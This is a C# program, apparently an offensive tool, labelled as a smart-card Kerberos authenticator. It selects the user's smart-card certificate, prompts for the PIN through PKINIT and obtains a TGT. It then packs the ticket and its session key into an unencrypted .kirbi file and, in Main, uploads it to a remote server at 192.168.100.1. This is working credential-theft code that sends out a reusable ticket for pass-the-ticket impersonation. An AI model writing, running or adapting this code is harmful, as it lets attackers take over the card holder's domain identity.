using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using DnsClient;
using DnsClient.Protocol;
using Kerberos.NET.Client;
using Kerberos.NET.Configuration;
using Kerberos.NET.Credentials;
using Kerberos.NET.Crypto;
using Kerberos.NET.Entities;


public class KerberosSmartCardAuthenticator
{
    #region KDC and Certificate Discovery

    public class KdcInfo
    {
        // satisfies CS8618 (non-nullable property must be initialised).
        public required string Target { get; set; }
        public ushort Port { get; set; }
        public ushort Priority { get; set; }
        public ushort Weight { get; set; }
    }

    public async Task<List<KdcInfo>> DiscoverAndSortKdcsAsync(string domain)
    {
        var lookup = new LookupClient();
        string query = $"_kerberos._tcp.dc._msdcs.{domain}";
        var result = await lookup.QueryAsync(query, QueryType.SRV);

        if (result.HasError)
        {
            Console.WriteLine($"[!] Error querying DNS: {result.ErrorMessage}");
            return new List<KdcInfo>();
        }

        var srvRecords = result.Answers.SrvRecords().Select(r => new KdcInfo
        {
            Priority = r.Priority,
            Weight = r.Weight,
            Port = r.Port,
            Target = r.Target.Value.TrimEnd('.')
        }).ToList();

        return SortKdcsByPriorityAndWeight(srvRecords);
    }

    private static List<KdcInfo> SortKdcsByPriorityAndWeight(List<KdcInfo> records)
    {
        var sortedKdcs = new List<KdcInfo>();
        var random = new Random();

        foreach (var group in records.GroupBy(r => r.Priority).OrderBy(g => g.Key))
        {
            var priorityGroup = group.ToList();
            while (priorityGroup.Count > 0)
            {
                int totalWeight = priorityGroup.Sum(r => r.Weight);
                if (totalWeight == 0)
                {
                    int idx = random.Next(priorityGroup.Count);
                    sortedKdcs.Add(priorityGroup[idx]);
                    priorityGroup.RemoveAt(idx);
                    continue;
                }

                int randomWeight = random.Next(1, totalWeight + 1);
                int runningWeight = 0;
                KdcInfo? selected = null;

                foreach (var record in priorityGroup)
                {
                    runningWeight += record.Weight;
                    if (randomWeight <= runningWeight) { selected = record; break; }
                }

                if (selected != null)
                {
                    sortedKdcs.Add(selected);
                    priorityGroup.Remove(selected);
                }
            }
        }
        return sortedKdcs;
    }

    public X509Certificate2? FindSmartCardCertificate()
    {
        const string smartCardLogonOid = "1.3.6.1.4.1.311.20.2.2";
        var validCerts = new List<X509Certificate2>();

        using var store = new X509Store(StoreName.My, StoreLocation.CurrentUser);
        store.Open(OpenFlags.ReadOnly);

        foreach (X509Certificate2 cert in store.Certificates)
        {
            if (!cert.HasPrivateKey || DateTime.Now < cert.NotBefore || DateTime.Now > cert.NotAfter)
                continue;

            bool hasEku = cert.Extensions
                .OfType<X509EnhancedKeyUsageExtension>()
                .Any(eku => eku.EnhancedKeyUsages.Cast<Oid>()
                    .Any(oid => oid.Value == smartCardLogonOid));

            if (!hasEku) continue;

            try
            {
                using var rsa = cert.GetRSAPrivateKey();
                bool isSmartCard = false;

                // CA1416: RSACryptoServiceProvider.CspKeyContainerInfo is Windows-only.
                if (rsa is RSACryptoServiceProvider rsaCsp)
                {
                    if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                    {
                        string pn = rsaCsp.CspKeyContainerInfo.ProviderName ?? string.Empty;
                        isSmartCard = IsKnownSmartCardProvider(pn);
                    }
                }
                else if (rsa is RSACng rsaCng)
                {
                    string pn = rsaCng.Key.Provider?.Provider ?? string.Empty;
                    isSmartCard = IsKnownSmartCardProvider(pn);
                }

                if (isSmartCard) validCerts.Add(cert);
            }
            catch { /* Private key inaccessible */ }
        }

        if (validCerts.Count == 0) return null;
        if (validCerts.Count == 1) return validCerts[0];
        return SelectCertificateFromConsole(validCerts);
    }

    private static bool IsKnownSmartCardProvider(string providerName)
    {
        if (string.IsNullOrEmpty(providerName)) return false;
        var known = new[]
        {
            "Smart Card", "Microsoft Base Smart Card", "Microsoft Smart Card Key Storage",
            "Gemalto", "SafeNet", "Entrust", "YubiKey", "OpenSC", "eToken",
        };
        return known.Any(p => providerName.IndexOf(p, StringComparison.OrdinalIgnoreCase) >= 0);
    }

    /// <summary>
    /// Cross-platform console certificate selector.
    /// X509Certificate2UI (Windows-only)
    /// </summary>
    private static X509Certificate2 SelectCertificateFromConsole(List<X509Certificate2> certs)
    {
        Console.WriteLine("\n[*] Multiple smart card certificates found. Please select one:");
        for (int i = 0; i < certs.Count; i++)
        {
            Console.WriteLine($"  [{i + 1}] Subject   : {certs[i].Subject}");
            Console.WriteLine($"       Thumbprint : {certs[i].Thumbprint}");
            Console.WriteLine($"       Expires    : {certs[i].NotAfter:yyyy-MM-dd}");
        }
        while (true)
        {
            Console.Write($"\nEnter selection (1-{certs.Count}): ");
            string? input = Console.ReadLine();
            if (int.TryParse(input, out int choice) && choice >= 1 && choice <= certs.Count)
                return certs[choice - 1];
            Console.WriteLine("[!] Invalid selection, please try again.");
        }
    }

    /// <summary>
    /// Extracts the UPN from the Subject Alternative Name extension.
    /// Uses the OS format API as a fast path, then falls back to raw DER parsing
    /// </summary>
    public string? GetUpnFromCertificate(X509Certificate2 cert)
    {
        // OID 2.5.29.17 = Subject Alternative Name
        var sanExt = cert.Extensions
            .Cast<X509Extension>()
            .FirstOrDefault(e => e.Oid?.Value == "2.5.29.17");

        if (sanExt == null) return null;

        string sanText = new AsnEncodedData(sanExt.Oid, sanExt.RawData).Format(false);
        var patterns = new[]
        {
            @"User Principal Name=([^\s,]+)",
            @"UPN=([^\s,]+)",
            @"upn=([^\s,]+)",
            @"1\.3\.6\.1\.4\.1\.311\.20\.2\.3=([^\s,]+)",
        };

        foreach (var pattern in patterns)
        {
            var m = Regex.Match(sanText, pattern, RegexOptions.IgnoreCase);
            if (m.Success) return m.Groups[1].Value.Trim();
        }

        return TryParseUpnFromRawSan(sanExt.RawData);
    }

    private static string? TryParseUpnFromRawSan(byte[] rawData)
    {
        // OtherName OID for UPN: 1.3.6.1.4.1.311.20.2.3
        byte[] upnOid = { 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x03 };
        int oidPos = FindBytes(rawData, upnOid);
        if (oidPos < 0) return null;

        for (int i = oidPos + upnOid.Length; i < rawData.Length - 2; i++)
        {
            if (rawData[i] == 0x0C || rawData[i] == 0x16) // UTF8String or IA5String
            {
                int len = rawData[i + 1];
                if ((len & 0x80) != 0)
                {
                    int lb = len & 0x7F;
                    if (i + 1 + lb >= rawData.Length) break;
                    len = 0;
                    for (int j = 0; j < lb; j++) len = (len << 8) | rawData[i + 2 + j];
                    i += lb;
                }
                int vs = i + 2;
                if (vs + len <= rawData.Length)
                    return System.Text.Encoding.UTF8.GetString(rawData, vs, len);
            }
        }
        return null;
    }

    private static int FindBytes(byte[] haystack, byte[] needle)
    {
        for (int i = 0; i <= haystack.Length - needle.Length; i++)
        {
            bool ok = true;
            for (int j = 0; j < needle.Length; j++)
                if (haystack[i + j] != needle[j]) { ok = false; break; }
            if (ok) return i;
        }
        return -1;
    }

    #endregion
}

public class Program
{
    public static async Task Main(string[] args)
    {
        var authenticator = new KerberosSmartCardAuthenticator();

        Console.WriteLine("[*] Locating smart card certificate...");
        X509Certificate2? certificate = authenticator.FindSmartCardCertificate();

        if (certificate == null)
        {
            Console.WriteLine("[!] No suitable smart card certificate found.");
            return;
        }

        using (certificate)
        {
            Console.WriteLine($"[+] Found certificate: {certificate.Subject}");

            string? upn = authenticator.GetUpnFromCertificate(certificate);
            if (string.IsNullOrEmpty(upn))
            {
                Console.WriteLine("[!] Certificate does not contain a User Principal Name (UPN).");
                return;
            }
            Console.WriteLine($"[+] UPN: {upn}");

            string domain = upn.Split('@').Last();
            Console.WriteLine($"[+] Domain: {domain}");

            Console.WriteLine("\n[*] Discovering KDCs (for logging purposes)...");
            var kdcs = await authenticator.DiscoverAndSortKdcsAsync(domain);
            if (kdcs.Count > 0)
                Console.WriteLine($"[+] Found {kdcs.Count} KDC(s). Highest priority: {kdcs.First().Target}");
            else
                Console.WriteLine("[!] No KDCs found via DNS SRV. KerberosClient will fall back to domain name resolution.");

            Console.WriteLine("\n[*] Requesting TGT via PKINIT (PIN prompt may appear)...");
            try
            {
                byte[] kirbi = await RequestTgtViaPkinit(certificate, upn, domain);

                Console.WriteLine($"[DBG] kirbi byte length: {kirbi?.Length ?? -1}");

                if (kirbi == null || kirbi.Length == 0)
                {
                    Console.WriteLine("[-] kirbi bytes are null or empty — EncodeKirbi failed silently.");
                    return;
                }

                using var http = new System.Net.Http.HttpClient();

                var content = new System.Net.Http.MultipartFormDataContent();
                content.Add(
                    new System.Net.Http.ByteArrayContent(kirbi),
                    "ticket",                            
                    $"{upn.Split('@')[0]}.kirbi"         
                );

                Console.WriteLine("[*] Uploading TGT to http://192.168.100.1/upload ...");
                var response = await http.PostAsync("http://192.168.100.1/upload", content);

                Console.WriteLine($"[+] Server response: {(int)response.StatusCode} {response.ReasonPhrase}");
                string body = await response.Content.ReadAsStringAsync();
                if (!string.IsNullOrWhiteSpace(body))
                    Console.WriteLine($"[+] Body: {body}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] TGT request failed: {ex.Message}");
                if (ex.InnerException != null)
                    Console.WriteLine($"    Inner: {ex.InnerException.Message}");
                Console.WriteLine($"    Stack: {ex.StackTrace}");
            }
        }
    }

    private static async Task<byte[]> RequestTgtViaPkinit(X509Certificate2 cert, string upn, string domain)
    {
        var config = Krb5Config.CurrentUser();
        config.Defaults.DefaultRealm = domain.ToUpperInvariant();

        var credential = new WindowsPkinitCredential(cert, upn)
        {
            Domain = domain.ToUpperInvariant(),
            IncludeOption = X509IncludeOption.WholeChain
        };

        using var client = new KerberosClient(config);

        // AS-REQ / AS-REP — the CSP/KSP will prompt for the smart card PIN here
        await client.Authenticate(credential);

        // <summary>
        // Retrieve the TGT from the internal ticket cache
        //
        // GetCacheItem always returns an instance; when the key is absent the returned
        // object has KdcResponse == null (same guard used inside KerberosClient itself).
        //
        // Cache key: KerberosClient.CacheTgt() stores the entry under
        // kdcRep.Ticket.SName.FullyQualifiedName → "krbtgt/<REALM>".
        // Windows AD KDCs return the realm in uppercase; MIT/Heimdal use lowercase.
        // </summary>
        string realm = domain.ToUpperInvariant();
        string tgtKey = $"krbtgt/{realm}";
        var entry = client.Cache.GetCacheItem<KerberosClientCacheEntry>(tgtKey);

        if (entry.KdcResponse == null)
        {
            tgtKey = $"krbtgt/{domain.ToLowerInvariant()}";
            entry = client.Cache.GetCacheItem<KerberosClientCacheEntry>(tgtKey);
        }

        if (entry.KdcResponse == null)
            throw new InvalidOperationException(
                "Authentication succeeded but the TGT could not be found in the ticket cache. " +
                $"Tried: 'krbtgt/{realm}' and 'krbtgt/{domain.ToLowerInvariant()}'.");

        return EncodeKirbi(entry);
    }

    /// <summary>
    /// Encodes a cached TGT as a KRB-CRED (.kirbi) byte array
    /// (client realm field per RFC 4120 §5.8.1)
    /// </summary>
    private static byte[] EncodeKirbi(KerberosClientCacheEntry entry)
    {
        // All KrbCredInfo fields except Key are OPTIONAL (RFC 4120 §5.8.1).
        var credInfo = new KrbCredInfo
        {
            // Session key decrypted from the AS-REP enc-part; stored on the entry
            Key = entry.SessionKey,

            Realm = entry.KdcResponse.CRealm,
            PName = entry.KdcResponse.CName,

            // Ticket flags and lifetime are stored directly on the entry (decrypted by
            // KerberosClient from the AS-REP enc-part during Authenticate())
            Flags = entry.Flags,
            AuthTime = entry.AuthTime,
            StartTime = entry.StartTime,
            EndTime = entry.EndTime,
            RenewTill = entry.RenewTill,

            // Service realm from the raw (opaque) ticket wrapper; service name from
            // the entry directly — NOT from a non-existent .Server property.
            SRealm = entry.KdcResponse.Ticket.Realm,
            SName = entry.SName,
        };

        var encCredPart = new KrbEncKrbCredPart
        {
            TicketInfo = new[] { credInfo }
        };

        // KrbPriv, and every other KRB message type in Kerberos.NET.
        // EType = NULL signals that the Cipher is an unencrypted DER blob — the standard
        var krbCred = new KrbCred
        {
            Tickets = new[] { entry.KdcResponse.Ticket },

            EncryptedPart = new KrbEncryptedData
            {
                EType = EncryptionType.NULL,
                Cipher = encCredPart.EncodeApplication()
            }
        };

        return krbCred.EncodeApplication().ToArray();
    }
}
